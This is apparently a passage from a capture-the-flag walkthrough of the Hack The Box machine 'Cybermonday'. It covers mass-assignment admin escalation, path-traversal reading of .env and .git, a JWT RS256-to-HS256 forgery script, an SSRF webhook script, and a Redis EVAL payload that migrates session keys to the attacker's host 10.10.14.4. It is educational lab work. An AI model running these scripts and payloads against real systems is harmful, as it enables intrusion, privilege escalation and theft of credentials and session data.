update \`users\` set \`username\` = admin, \`users\`.\`updated_at\` = 2023-08-21 14:38:16 where \`id\` = 9 And the PHP context is this (app/Http/Controllers/ProfileCotnroller.php:33):
public function index() { return view(&#39;home.profile&#39;, [ &#39;title&#39; =&gt; &#39;Profile&#39; ]); } public function update(Request $request) { $data = $request-&gt;except([&#34;_token&#34;,&#34;password&#34;,&#34;password_confirmation&#34;]); $user = User::where(&#34;id&#34;, auth()-&gt;user()-&gt;id)-&gt;first(); if(isset($request-&gt;password) &amp;&amp; !empty($request-&gt;password)) { if($request-&gt;password != $request-&gt;password_confirmation) { session()-&gt;flash(&#39;error&#39;,&#39;Password dont match&#39;); return back(); } $data[&#39;password&#39;] = bcrypt($request-&gt;password); } $user-&gt;update($data); session()-&gt;flash(&#39;success&#39;,&#39;Profile updated&#39;); return back(); } } What about the Register page? Knowing that the application logic is a little lax, I again tried registering as admin and got this error page:
The query shown at the top is this:
insert into \`users\` (\`username\`, \`email\`, \`password\`, \`updated_at\`, \`created_at\`) values (admin, admin@admin.admin, $2y$10$rJZpb/9uPMMAOM4Rl/n8BexUTNzZhmC21ioPRZgtdS1tJYfuRQIoq, 2023-08-21 11:42:58, 2023-08-21 11:42:58) And the PHP context (app/Models/User.php:48):
]; /** * The attributes that should be hidden for serialization. * * @var array&lt;int, string&gt; */ protected $hidden = [ &#39;password&#39;, &#39;remember_token&#39;, ]; /** * The attributes that should be cast. * * @var array&lt;string, string&gt; */ protected $casts = [ &#39;isAdmin&#39; =&gt; &#39;boolean&#39;, &#39;email_verified_at&#39; =&gt; &#39;datetime&#39;, ]; public function insert($data) { $data[&#39;password&#39;] = bcrypt($data[&#39;password&#39;]); return $this-&gt;create($data); } } Oh, wow&hellip; that $casts = ['isAdmin' =&gt; 'boolean', 'email_verified_at' =&gt; 'datetime',]; part looks very suspicious. I&rsquo;ll take a look at how the offending request looks in Burp. I&rsquo;ll try registering a new user, but this time proxy it through Burp and add an isAdmin field:
It seems like this request caused no errors server-side, but unfortunately it did not have the desired effect. After I tried logging in with jimbob6 : password, I was still a regular low-priv user.
Next, I&rsquo;ll try something similar, but this time using the Home &gt; View Profile screen instead. I&rsquo;ll &ldquo;update&rdquo; my profile and add this isAdmin field to the request:
And this resulted in another error page!
Ah, I see. So I should probably try providing an integer to cast into a boolean, instead of the word True. Since this is an SQL error, I&rsquo;ll use an integer that SQL would cast into a boolean: 1 for True, 0 for False:
&#x1f4ab; Wow - That actually worked!
After submitting that request, the /home page has a new element in the header navbar, &lsquo;Dashboard&rsquo;:
Dashboard Page When clicking on Dashboard, I&rsquo;m redirected to a page with a sidebar to choose from four options:
Dashboard: The default page. Just shows some graphs with sample data. Does not look important. Products: Allows for new products to be defined, including a photo for the product. Changelog: A change log for the web app. Back to Home Page: Just a shortcut back to /home I tried out Products and defined a new product. I then viewed the website as an unauthenticated user to see if it worked:
Ok, it works. I checked out the image in the DOM to see how it gets loaded It appears to be rendered as a base64-encoded image:
I&rsquo;m trying to see if the image gets modified at all. If any modification is occurring, then there&rsquo;s a chance it may carry some of the old Imagemagick vulnerabilities. Also, if the image somehow gets parsed as PHP, then foothold could be as simple as planting a webshell.
I tried copying the image data /9j/4AAQsk... into a file. Then I found the original picture that I uploaded and base64-encoded it myself, and compared the two files using diff:
vim beaver.b64 # [PASTE] base64 -w 0 beaver.jpeg &gt; beaver.b64-orig # [Then open and close it using vim to append a newline]: vim beaver.b64-orig diff beaver.b64 beaver.b64-orig # No difference! Ok, so there&rsquo;s a pretty good chance that the image is simply being encoded in it&rsquo;s original format; i.e. no parsing or image modifications are taking place - so this idea about using an image as the exploit is probably a dead-end.
So if the /dashboard/products page is a dead end, then by elimination the way forward could be in /dashboard/changelog. Here is the most recent portion of the changelog:
&#x261d;&#xfe0f; Aha! This [Unreleased] version probably corresponds to the git hash that was shown from the SQL error stack trace page: One thing to note is that, if they recently fixed an SQLi on the login page - perhaps there is still an SQLi on the registration page, or on Home &gt; View Profile? Maybe I&rsquo;ll loop back to this later &#x1f6a9;
For now, that line about the Webhook looks especially interesting to me. It&rsquo;s for creating registration logs, eh? And if it&rsquo;s still in beta, there&rsquo;s a good chance it has bugs or vulnerabilities &#x1f63c;
Webhook Scripting The webhook address is:
http://webhooks-api-beta.cybermonday.htb/webhooks/fda96d32-e8c8-4301-8fb3-c821a316cf77
Now that I know of a new subdomain, I&rsquo;ll add it to my /etc/hosts:
echo &#34;$RADDR webhooks-api-beta.cybermonday.htb&#34; | sudo tee -a /etc/hosts Since it&rsquo;s in my /etc/hosts file, I should be able to navigate to that domain now. I&rsquo;ll check out the domain itself:
&#x1f606; Awesome! I also tried checking this page using an unauthenticated session and got the same result. That&rsquo;s a big security blunder!
I can already see where this is going; look at the last entry in the above image: it has the sendRequest(url, method) action. This must be an SSRF opportunity! But first, I&rsquo;ll need to know or create a valid uuid. First, I&rsquo;ll try GET /webhooks:
Hmm, ok. Perhaps I need to use the POST /auth/register and POST /auth/login routes first. Since I can already see that this might be a multi-step process, I&rsquo;ll start scripting it in Python.
I&rsquo;ll show the whole script later in the walkthrough (once I finish writing it), but here&rsquo;s a snippet of it showing how I got the /auth endpoints to work:
#[...SNIP...] s = requests.session() def randomCreds(): x = hex(random.getrandbits(64))[2:] # strip off the &#39;0x&#39; return (f&#39;user_{x}&#39;, f&#39;pass_{x}&#39;) def register(username, password): &#39;&#39;&#39; Register a new user, through the POST /auth/register endpoint &#39;&#39;&#39; endpoint = &#39;/auth/register&#39; resp = s.post( f&#39;{args.target}{endpoint}&#39;, json = {&#39;username&#39;:username, &#39;password&#39;:password} ) print(f&#39;[{resp.status_code}] POST {endpoint}\\n{resp.text}\\n&#39;) def login(username, password): &#39;&#39;&#39; Log in using the POST /auth/login endpoint &#39;&#39;&#39; endpoint = &#39;/auth/login&#39; resp = s.post( f&#39;{args.target}{endpoint}&#39;, json = {&#39;username&#39;:username, &#39;password&#39;:password} ) print(f&#39;[{resp.status_code}] POST {endpoint}\\n{resp.text}\\n&#39;) (username,password) = randomCreds() register(username,password) login(username,password) &#x1f44d; That&rsquo;s a step in the right direction. It looks like /auth/login provides an x-access-token token in the response. This type of token is meant to be included as a request header, so that&rsquo;s what I&rsquo;ll do when contacting any of the /webhooks endpoints.
I added some more code to take the token and use it as a header for GET /webhooks:
#[...SNIP...] def login(username, password): &#39;&#39;&#39; Log in using the POST /auth/login endpoint &#39;&#39;&#39; endpoint = &#39;/auth/login&#39; resp = s.post( f&#39;{args.target}{endpoint}&#39;, json = {&#39;username&#39;:username, &#39;password&#39;:password} ) print(f&#39;[{resp.status_code}] POST {endpoint}\\n{resp.text}\\n&#39;) try: data = resp.json() return data[&#39;message&#39;][&#39;x-access-token&#39;] except Exception as e: print(f&#39;Encountered error while parsing response JSON:\\n{e}&#39;) sys.exit() def getWebhooks(token): &#39;&#39;&#39; Retrieve the list of webhooks. Return the array of webhooks &#39;&#39;&#39; endpoint = &#39;/webhooks&#39; resp = s.get( f&#39;{args.target}{endpoint}&#39;, headers = {&#39;x-access-token&#39;: token} ) print(f&#39;[{resp.status_code}] GET {endpoint}\\n{resp.text}\\n&#39;) try: data = resp.json() return data[&#39;message&#39;] except Exception as e: print(f&#39;Encountered error while parsing response JSON:\\n{e}&#39;) sys.exit() #[...SNIP...] token = login(username,password) uuids = getWebhooks(token) Excellent, the authentication worked. The uuid shown above matches the one from the changelog. Now that I&rsquo;m able to interact with /webhooks, I see two ways to utilize this:
Create a new webhook using /webhooks/create, and make it use the sendRequest action. Use this action to perform an SSRF&hellip; But what restricted resource would I try to request? &#x1f914; maybe the database? Use the existing webhook (or define a new one) and use the createLogFile action. Use this action to drop a webshell onto the server. If necessary, check for a directory traversal to place the file where I can access it. Since (2) seems more direct, I&rsquo;ll try that first. It should be a simple addition to the script I already have working.
Webhook - File Write Now that I know the UUID of the webhook aluded-to in the Changelog, I can try using the webhook. To interact with this webhook, I wrote another function for my script:
def createLogFile(token, uuid, log_name, log_content): &#39;&#39;&#39; use the createLogFile action in an existing webhook &#39;&#39;&#39; endpoint = f&#39;/webhooks/{uuid}&#39; resp = s.post( f&#39;{args.target}{endpoint}&#39;, headers = {&#39;x-access-token&#39;: token}, json = { &#39;log_name&#39;: log_name, &#39;log_content&#39;: log_content } ) print(f&#39;[{resp.status_code}] POST {endpoint}\\n{resp.text}\\n&#39;) #[...SNIP...] uuid = getWebhooks(token)[0][&#39;uuid&#39;] createLogFile(token, uuid, &#39;mylogfile1&#39;, &#39;These are my logfile contents&#39;) Seemingly, this was successful:
That&rsquo;s great, but now I&rsquo;ll have to find where that log file is visible, if it even is visible&hellip; For now, this seems like something that is unlikely to produce any progress, but perhaps I&rsquo;ll come back to it later &#x1f6a9;
Since (1) takes less guesswork, I&rsquo;ll try that first.
Webhook - SSRF The end goal of an SSRF is usually to exfiltrate some data. So, as a proof-of-concept, I&rsquo;ll stand up a python webserver on my attacker machine and see if I can get the target to contact it.
Usually, I would just use python&rsquo;s http.server module for this. However, that module isn&rsquo;t ideal if you intend on contacting it with a POST request, or any message with a body.
To get past this, I got ChatGPT to write me a bit of a code skeleton, then modified it to suit my needs. I also fixed a bunch of bugs that were present in the code it provided. You can get a copy of it from my repo on Github: https://github.com/4wayhandshake/simple-http-server
To perform SSRF using the webhook API present on the target, I&rsquo;ll have to use the sendRequest action. However, since the only existing webhook doesn&rsquo;t perform that action, I&rsquo;ll have to create my own webhook. To do this, I added a function to my script:
#[...SNIP...] def createWebhook(token, name, description, action): &#39;&#39;&#39; Create a new webhook &#39;&#39;&#39; endpoint = &#39;/webhooks/create&#39; resp = s.post( f&#39;{args.target}{endpoint}&#39;, headers = {&#39;x-access-token&#39;: token}, json = { &#39;name&#39;: name, &#39;description&#39;: description, &#39;action&#39;: action } ) print(f&#39;[{resp.status_code}] POST {endpoint}\\n{resp.text}\\n&#39;) # ...Return the UUID? #[...SNIP...] token = login(username,password) createWebhook(token, &#39;makerequest&#39;, &#39;webhook to make an http request&#39;, &#39;sendRequest&#39;) But unfortunately, it didn&rsquo;t work:
Hmm&hellip; that&rsquo;s too bad. I tried using the token both with and without calling getWebhooks(), but still no luck. I also tried authenticating as the user that I had previously set as admin, &ldquo;jimbob6&rdquo;, but it resulted in the same 403 Unauthorized message. Maybe there&rsquo;s more to this token than meets the eye? It looks like a JWT, so I&rsquo;ll try throwing it into Cyberchef to decompose it:
Aha! So there is more than meets the eye. The token encapsulates a role field that I hadn&rsquo;t anticipated. I bet if I re-wrote the JWT to use &quot;role&quot;: &quot;admin&quot;, I&rsquo;d be able to create a webhook&hellip; There must be a way to find the JWT signing key. I bet there&rsquo;s an LFI &#x1f914;
And just to get even more detail, I&rsquo;ll try decomposing the JWT in bash. Any JWT has the form &lt;header&gt;.&lt;payload&gt;.&lt;signature&gt;, where all are base64-encoded. So it&rsquo;s easy to just read them using base64 -d:
Note: this is for a JWT generated using a different random username than the Cyberchef image above. Same idea though.
While the payload is exactly as Cyberchef showed, now we know the JWT header as well: it uses RS256 as an algorithm. I&rsquo;ll be honest, that&rsquo;s kind of bad news&hellip; Now I must search for two files: the private key and the public key &#x1f44e;
Searching for LFI As luck would have it, I already wrote a nice script for searching for LFIs! I wrote it for a previous box in this competition, Download. My script is written in bash, and not very fast, but it definitely works. Please see my github repo to try it out: https://github.com/4wayhandshake/LFI-Enumerator.
The script requires a few things:
a wordlist of files that, when found, would indicate an LFI was discovered. Ideally, this list is not too long (under 100 lines) cookies to use with each request (optional) the address where the LFI should be rooted, ex. http://cybermonday/products the minimum and maximum depth to &ldquo;look backwards&rdquo; when attempting LFIs. Ex http://cybermonday/products/../../ is 2 steps back using the &ldquo;../&rdquo; pattern. &hellip;and a few other options not important for this scenario (see the github repo for more detail) It will try various methods of path traversal to attempt to find an LFI (the patterns are specified in lfi-list.txt), running ffuf to look for an LFI at each depth of each traversal pattern.
To gather up the prerequisites, I first made a list of all files that might be indicative of an LFI, and saved them into targets.txt. I started with a list that I created:
package.json app.js server.js robots.txt env .env dotenv index.html index.php mylogfile1 # this is the log file that I created earlier Then I appended a couple other wordlists onto it, and eliminated the duplicates:
cat /usr/share/seclists/Discovery/Web-Content/apache.txt &gt;&gt; targets.txt; \\ cat /usr/share/seclists/Discovery/Web-Content/nginx.txt &gt;&gt; targets.txt; \\ sort -u targets.txt &gt; target_files.txt After that, used the results of Directory Enumeration of http://cybermonday.htb (along with other directories I had discovered along the way) and listed them all in a file called directories.txt:
/login /signup /products /home /assets /dashboard /dashboard/products /dashboard/changelog Note: the blank line at the top is intentional
Then, I set variables for the wordlist and my cookies, and ran my LFI-Enumerator script twice for each directory in the list - once without a trailing slash and once with a trailing slash:
WLIST=&#39;target_files.txt&#39; COOKIES=&#39;XSRF-TOKEN=eyJpdiI6IkRQTVpXN0tUa0lkWm0wTWhzSjg1a2c9PSIsInZhbHVlIjoiTXBqcTVxUzlLeXo0V1NiekI5Nmw2dmZBaVBQRncwbzFJZ3pWLzdxUzNwck1GRytIVmZSSnRJNnJOK3VQZUNzcHVkWU1HN2x2M1lscmdjMlc5cXdoWmNydEJSbHFBczcrcklCWUs2WVlUNDRXY1N5UGwzZTBNMVowUHhhNzZWVUYiLCJtYWMiOiJjNjg5NGZjOTYyYjlhMmUyYTA1NWVjYTIzMDY2MzQxNmVlMjg3MzRmYTQzYWViNTA3Y2Y0MDg2YjlhZGIxMmRiIiwidGFnIjoiIn0%3D;cybermonday_session=eyJpdiI6ImhkNzZqc0FOZktRZ2Y0QVZ6clJFU2c9PSIsInZhbHVlIjoibW90eHYwRGQ5aEZraDh3ZENMY0gvdHN1Y05iZWJ2a3N5NVdONU5GK1dPV2tRRG9ncGt3UVdoNDN3dWJKSUN2dmpKOXh6MTdDTThjSGM4b3R1NXRhaEdQR3V5b3phM1RuRlFUbGZMRGJnNnd0V0NDUCtvNGNNWlJpdCs2WkswVFoiLCJtYWMiOiI5MDU2NWM0Yjc0MTRkNjI5MzVlY2U4MTJiOGY2MGQ0YmRkNjU5OGI2Y2E0NzQ0NjNhMzAwMjFjMDNjN2EwNmU2IiwidGFnIjoiIn0%3D&#39; while read D; do echo &#34;Trying LFI-Enumerator rooted at $D (without trailing slash)\\n&#34; ; ./lfi-scan.sh &#34;http://cybermonday.htb$D&#34; 0 3 &#34;$COOKIES&#34; &#34;$WLIST&#34; 0 &#39;&#39; &#39;&#39; &#39;&#39;; echo &#34;Trying LFI-Enumerator rooted at $D (with trailing slash)\\n&#34; ; ./lfi-scan.sh &#34;http://cybermonday.htb$D/&#34; 0 3 &#34;$COOKIES&#34; &#34;$WLIST&#34; 0 &#39;&#39; &#39;&#39; &#39;&#39;; done &lt; directories.txt | tee lfi-enumeration-results.txt This took quite a while, so I went and had lunch. Also, it generated a lot of not-very-useful output, so when it was done running, I filtered it out:
grep -i -B 1 FFUF lfi-enumeration-results.txt I was left with a shortlist of just the useful results &#x1f609;
To summarize, my script found the file .env in three different ways:
http://cybermonday.htb/assets../.env http://cybermonday.htb/assets%2e%2e%2f.env http://cybermonday.htb/assets..%2f.env Wonderful! .env files are usually pretty juicy - let&rsquo;s check it out:
curl http://cybermonday.htb/assets../.env APP_NAME=CyberMonday APP_ENV=local APP_KEY=base64:EX3zUxJkzEAY2xM4pbOfYMJus+bjx6V25Wnas+rFMzA= APP_DEBUG=true APP_URL=http://cybermonday.htb LOG_CHANNEL=stack LOG_DEPRECATIONS_CHANNEL=null LOG_LEVEL=debug DB_CONNECTION=mysql DB_HOST=db DB_PORT=3306 DB_DATABASE=cybermonday DB_USERNAME=root DB_PASSWORD=root BROADCAST_DRIVER=log CACHE_DRIVER=file FILESYSTEM_DISK=local QUEUE_CONNECTION=sync SESSION_DRIVER=redis SESSION_LIFETIME=120 MEMCACHED_HOST=127.0.0.1 REDIS_HOST=redis REDIS_PASSWORD= REDIS_PORT=6379 REDIS_PREFIX=laravel_session: CACHE_PREFIX= MAIL_MAILER=smtp MAIL_HOST=mailhog MAIL_PORT=1025 MAIL_USERNAME=null MAIL_PASSWORD=null MAIL_ENCRYPTION=null MAIL_FROM_ADDRESS=&#34;hello@example.com&#34; MAIL_FROM_NAME=&#34;\${APP_NAME}&#34; AWS_ACCESS_KEY_ID= AWS_SECRET_ACCESS_KEY= AWS_DEFAULT_REGION=us-east-1 AWS_BUCKET= AWS_USE_PATH_STYLE_ENDPOINT=false PUSHER_APP_ID= PUSHER_APP_KEY= PUSHER_APP_SECRET= PUSHER_APP_CLUSTER=mt1 MIX_PUSHER_APP_KEY=&#34;\${PUSHER_APP_KEY}&#34; MIX_PUSHER_APP_CLUSTER=&#34;\${PUSHER_APP_CLUSTER}&#34; CHANGELOG_PATH=&#34;/mnt/changelog.txt&#34; REDIS_BLACKLIST=flushall,flushdb There&rsquo;s a credential in there mysql/cybermonday root : root
I&rsquo;ll come back to this .env file in a bit, but for now I want to re-perform directory and file enumeration on the target using the LFI I just found. Usually, I find the best tool for doing this is ffuf. Since I can already tell there will be a lot of results, I&rsquo;ll proxy it through Burp and try to build a site map:
OUTPUT=&#34;fuzzing/directory-lfi&#34; WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt&#34; ffuf -w $WLIST:FUZZ -u http://$DOMAIN/assets../FUZZ -t 80 --recursion --recursion-depth 2 -c -o &#34;$OUTPUT.json&#34; -of json -e php,asp,js,html -timeout 4 -v -x &#34;http://127.0.0.1:8080&#34; Oh, whoa! I should have expected it, but there&rsquo;s a .git directory in there! That&rsquo;s the best of all. I&rsquo;ll use a very handy tool called githacker to reconstruct the project source code using the .git directory:
githacker --url &#34;http://cybermonday.htb/assets../.git/&#34; --output-folder &#34;source/githacker-output&#34; &#x1f44f; Beautiful! Having both the source code and the .env file is a really good position to be in.
I took a very thorough look through the source code. It&rsquo;s a surprisingly large application, with many pieces to it. Despite my initial optimism, I didn&rsquo;t end up finding anything useful, really. Oh well &#x1f937;&zwj;&#x2642;&#xfe0f;
The JWT Key Back in the section Webhook - SSRF, I described how I was thwarted by the 403 Unauthorized when attempting to create a new webhook. Now that I have the APP-KEY from the .env file, I&rsquo;ll try re-signing the JWT from earlier. I included the key into my script and decoded it from base 64:
# [...SNIP...] import jwt import base64 APP_KEY = &#34;EX3zUxJkzEAY2xM4pbOfYMJus+bjx6V25Wnas+rFMzA=&#34; key = base64.b64decode(APP_KEY) # [...SNIP...] def jwtDecode(token, key): decoded = jwt.decode(token, key, algorithms=[&#39;RS256&#39;]) return decoded # [...SNIP...] However, when attempting to run this code I was met with all kinds of errors. I should have known better, too&hellip; clearly the key I provided was NOT compliant with the RS256 algorithm - it&rsquo;s not an RSA private key! A proper RSA key would have started with the usual &ldquo;-----BEGIN PRIVATE KEY-----&rdquo;.
This got me wondering: if I don&rsquo;t have the correct key, and I obviously need to find a way to re-write this JWT, maybe there is a way to bypass the security? I found an article describing exactly that. It describes a half dozen techniques for bypassing or tricking JWT security. I began going through the techniques one by one. I won&rsquo;t bother writing down what didn&rsquo;t work, because ultimately I did find one technique (the very last one listed) that did work.
The successful technique was using a tool that calculates the public key by enumerating way that RSA keys are generated: it takes as inputs two unique JWTs. Since I already had a script that generates random users, registers them, and logs in - thus obtaining a unique JWT - I used that script to produce two JWTs and fed them into the tool:
TOK1=&#39;eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpZCI6MTUsInVzZXJuYW1lIjoidXNlcl84MWY2ZTBiNmFjZGUzMjgxIiwicm9sZSI6InVzZXIif....ysRZW8EiEFq7Oio40AfScVrrrEKW45B5nZIDcjCumk_4nmcUr3Wj7jIg3H-yg&#39; TOK2=&#39;eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpZCI6MTYsInVzZXJuYW1lIjoidXNlcl85MDJhMDViODA1YTkzZGRjIiwicm9sZSI6InVzZXIifQ....hOKQbDnGmASjjKgzhjTUkV5tktYr9xxxbHoToM6PyBStkv6V22_qekytgQiA&#39; ./recover.py &#34;$TOK1&#34; &#34;$TOK2&#34; Within a minute or so, the tool calculated a public key! This could be used for JWT verification, if I wanted.
Recovering public key for algorithm RS256... Found public RSA key ! n=21077705076198164110050345996612932810772518568443539050967722091376715840724373912088648727462840166192414559973502765046018099237341992732922789436498722625887217896319265594400430914391266628569217137860641259990767701853837981346406368514447786224553261574429635839050870271936160397598030752338538909555533403716740628865097430507 e=65537 -----BEGIN PUBLIC KEY----- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEApvezvAKCOgxwsiyV6PRJ fGMul+WBYorwFIWudWKkGejMx3onUSlM8OA3PjmhFNCP/8jJ7WA2gDa8oP3N2J8z Fyadnrt2Xe59FdcLXTPxbbfFC0aTGkDIOPZYJ8kR0cly0fiZiZbg4VLswYsh3Sn7 97IlIYr6Wqfc6ZPn1nsEhOrwO+qSD4Q24FVYeUxsn7pJ0oOWHPD+qtC5q3BR2M/S xBrxXh9vqcNBB3ZRRA0H0FDdV6Lp/8wJY7RB8eMREgSe48r3k7GlEcCLwbsyCyhn gysgHsq6yJYM82BL7V8Qln42yij1BM7fCu19M1EZwR5eJ2Hg31ZsK5uShbITbRh1 6wIDAQAB -----END PUBLIC KEY----- Wonderful! Now, what can I possibly do with just the public key? I did see something in that article of insecure JWT attacks referring to how the server might be able to be tricked into using HS256 instead of RS256, as long as the RS256 public key has already been found. It&rsquo;s commonly referred to as Algorithm Confusion or Key Confusion. I wrote the following python to try it out (But first, I saved the key into a file that my python script could access, rsa_key.pub):
# ... def rs256AttackToHs256Attack(token, public_key, makeAdmin=False): old_token_payload = jwt.decode(token, verify=False) if makeAdmin: old_token_payload[&#39;role&#39;] = &#39;admin&#39; with open(&#39;rsa_key.pub&#39;, &#39;rb&#39;) as f: key = f.read() new_token = jwt.encode(old_token_payload, key=key, algorithm=&#39;HS256&#39;).decode(&#39;utf-8&#39;) return new_token # ... token = login(username,password) test_token = rs256AttackToHs256Attack(token, pubkey, True) getWebhooks(test_token) Aside: finding the public key in a different way
The public key should be, well, public. It stands to reason that I should be able to find it by doing some directory and file enumeration on the target. While reading a guide on JWT Algorithm Confusion by Portswigger, I learned that a common way to provide the public key for JWT asymmetric algorithms is to host a jwks.json file. I checked which of my wordlists had this file, then ran ffuf using one of the wordlists I found:
cd /usr/share/seclists/Discovery find . -type f -exec grep -H -n jwks {} \\; # One result was ./Web-Content/common.txt cd ~/Box_Notes/Cybermonday WLIST=/usr/share/seclists/Discovery/Web-Content/common.txt ffuf -w $WLIST:FUZZ -u &#34;http://webhooks-api-beta.cybermonday.htb/FUZZ&#34; -t 80 -c -o &#34;fuzzing/webhooks-files-and-dirs.json&#34; -e &#39;php,asp,js,html,json&#39; -timeout 4 Very quickly, I found exactly what I was looking for:
Here is the contents of jwks.json. It discloses the n and e, just like an RSA public key should:
{&#34;keys&#34;: [{ &#34;kty&#34;: &#34;RSA&#34;, &#34;use&#34;: &#34;sig&#34;, &#34;alg&#34;: &#34;RS256&#34;, &#34;n&#34;: &#34;pvezvAKCOgxwsiyV6PRJfGMul-WBYorwFIWudWKkGejMx3onUSlM8OA3PjmhFNCP_8jJ7WA2gDa8oP3N2J8zFyadnrt2Xe59FdcLXTPxbbfFC0aTGkDIOPZYJ8kR0cly0fiZiZbg4VLswYsh3Sn797IlIYr6Wqfc6ZPn1nsEhOrwO-qSD4Q24FVYeUxsn7pJ0oOWHPD-qtC5q3BR2M_SxBrxXh9vqcNBB3ZRRA0H0FDdV6Lp_8wJY7RB8eMREgSe48r3k7GlEcCLwbsyCyhngysgHsq6yJYM82BL7V8Qln42yij1BM7fCu19M1EZwR5eJ2Hg31ZsK5uShbITbRh16w&#34;, &#34;e&#34;: &#34;AQAB&#34; }]} That Portswigger article on JWT algorithm confusion shows exactly how to make use of this data. Basically, use the Burp JWT Editor extension to convert the contents of jwks.json into a .pem key, then follow the instructions directly from the other article.
RS256 to HS256 Signature Attack The attack is pretty simple: sign a JWT using the public key, while specifying that the algorithm is HS256. The section of the article talking about this attack shows the following sample code:
import jwt old_token = &#39;eyJ0eXAiOiJKV1Q[...].eyJpc3MiOiJodHRwO[...].HAveF7AqeKj-4[...]&#39; old_token_payload = jwt.decode(old_token, verify=False) public_key = open(&#39;pubkey.pem&#39;, &#39;r&#39;).read() new_token = jwt.encode(old_token_payload, key=public_key, algorithm=&#39;HS256&#39;) print(new_token) I have my public key stored in a local file, but it&rsquo;s not .pem. Instead, I&rsquo;ll follow the guidance of the official PyJWT documentation and just load the file contents directly (formatted as a typical RSA public key). For that, I used the code shown earlier (my python function, rs256AttackToHs256Attack()). It seems like that code successfuly generates a token, so I&rsquo;ll try using that generated token through a function to create a new webhook:
def createWebhook(token, name, description, action): &#39;&#39;&#39; Create a new webhook &#39;&#39;&#39; endpoint = &#39;/webhooks/create&#39; resp = s.post( f&#39;{args.target}{endpoint}&#39;, headers = { &#39;x-access-token&#39;: token, }, json = { &#39;name&#39;: name, &#39;description&#39;: description, &#39;action&#39;: action } ) print(f&#39;[{resp.status_code}] POST {endpoint}\\n{resp.text}\\n&#39;) try: data = resp.json() return data[&#39;webhook_uuid&#39;] except Exception as e: print(f&#39;Encountered error while parsing response JSON:\\n{e}&#39;) sys.exit() def sendRequest(token, uuid, url, method): &#39;&#39;&#39; use the sendRequest action in an existing webhook &#39;&#39;&#39; endpoint = f&#39;/webhooks/{uuid}&#39; resp = s.post( f&#39;{args.target}{endpoint}&#39;, headers = {&#39;x-access-token&#39;: token}, json = { &#39;url&#39;: url, &#39;method&#39;: method } ) print(f&#39;[{resp.status_code}] POST {endpoint}\\n{resp.text}\\n&#39;) #... test_token = rs256AttackToHs256Attack(token, True) # x is the number suffixed to the randomized username and passwords uuid = createWebhook(test_token, f&#39;makerequest_{x}&#39;, &#39;webhook to make an http request&#39;, &#39;sendRequest&#39;) sendRequest(test_token, uuid, &#39;http://10.10.14.4:8000/ssrf&#39;, &#39;GET&#39;) i.e. the code is pre-configured to contact the webserver running on my attacker machine. I opened port 8000 of my firewall then ran my python script. This was the result:
Success! Using the webhook, I was finally able to perform a simple proof-of-concept SSRF.
To make the script a little more comfortable to use, I parse the SSRF instructions in a loop:
# ... def parseSSRF(token, uuid, cmd): methods = &#34;GET,POST,PUT,HEAD,DELETE,PATCH,OPTIONS,CONNECT,TRACE&#34;.split(&#39;,&#39;) i = cmd.find(&#39; &#39;) method = &#39;GET&#39; url = cmd[i+1:] if i &gt; 0: method = cmd[:i].upper() if (cmd[:i].upper() in methods) else &#39;GET&#39; sendRequest(token, uuid, url, method) # ... uuid = createWebhook(test_token, f&#39;makerequest_{x}&#39;, &#39;webhook to make an http request&#39;, &#39;sendRequest&#39;) while True: try: cmd = input(&#39;SSRF &gt; &#39;) if cmd == &#39;&#39;: break parseSSRF(token, uuid, cmd) except KeyboardInterrupt: break except Exception as e: print(f&#39;{e}\\n&#39;) Using the SSRF So, I have a functional SSRF. Now what? Usually, an SSRF is most useful for accessing a service that cannot be reached externally, but is available locally. So what services to I know about that I could not access before? Two things come to mind, both of which were mentioned in the .env file:
Redis MySQL I don&rsquo;t think MySQL is usually open to HTTP requests, so instead I&rsquo;ll focus on just Redis. For a webserver, Redis is usually used for caching, leveraging the server&rsquo;s RAM to improve all clients&rsquo; loading times. From the .env file, I already know the host is simply redis, so I&rsquo;ll try accessing it using the SSRF:
First, using the website, log in as a valid user. Then you can query Redis to obtain their session
POST /webhooks/dbbd4618-8642-4f0a-af62-0a1ccb6ca2cd HTTP/1.1 Host: webhooks-api-beta.cybermonday.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 content-type: application/json x-access-token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJqaW1ib2I2Iiwicm9sZSI6ImFkbWluIn0.Mjb8pCbYxlkbHz6z-0mqcKMdIS7AIUSVR4ootm3aMrw Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate DNT: 1 Connection: close Cookie: PHPSESSID=7b1dd4ee299cc80521f2c2fe9ab689d4 Upgrade-Insecure-Requests: 1 Sec-GPC: 1 Content-Length: 176 { &#34;url&#34;:&#34;http://redis:6379&#34;, &#34;method&#34;:&#34;EVAL &#39;for k,v in pairs(redis.call(\\&#34;KEYS\\&#34;, \\&#34;*\\&#34;)) do redis.pcall(\\&#34;MIGRATE\\&#34;,\\&#34;10.10.14.4\\&#34;, \\&#34;6379\\&#34;,v,0,10000) end&#39; 0\\r\\n\\r\\n&#34; } Checking my local redis (10.10.14.4:6379) I can see the key that was migrated over:
Then, running \`\` shows the value:
&#34;s:247:\\&#34;a:4:{s:6:\\&#34;_token\\&#34;;s:40:\\&#34;tUsI5KnfvPk8m8ilLUkBVwvadMRxVGtKN6j85efE\\&#34;;s:9:\\&#34;_previous\\&#34;;a:1:{s:3:\\&#34;url\\&#34;;s:27:\\&#34;http://cybermonday.htb/home\\&#34;;}s:6:\\&#34;_flash\\&#34;;a:2:{s:3:\\&#34;old\\&#34;;a:0:{}s:3:\\&#34;new\\&#34;;a:0:{}}s:50:\\&#34;login_web_59ba36addc2b2f9401580f014c7f58ea4e30989d\\&#34;;i:2;}\\&#34;;&#34; for comparison, the request to the browser was this:
